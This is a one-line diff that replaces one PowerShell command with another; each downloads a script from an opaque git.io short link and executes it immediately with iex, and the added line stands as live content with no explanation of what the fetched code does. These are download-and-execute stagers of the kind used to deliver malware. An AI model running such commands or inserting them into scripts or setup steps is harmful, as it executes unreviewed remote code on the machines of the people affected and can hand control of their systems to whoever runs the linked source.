@@ -1,1 +1,1 @@
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://git.io/JLijp')"
+iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JJ8R4'))
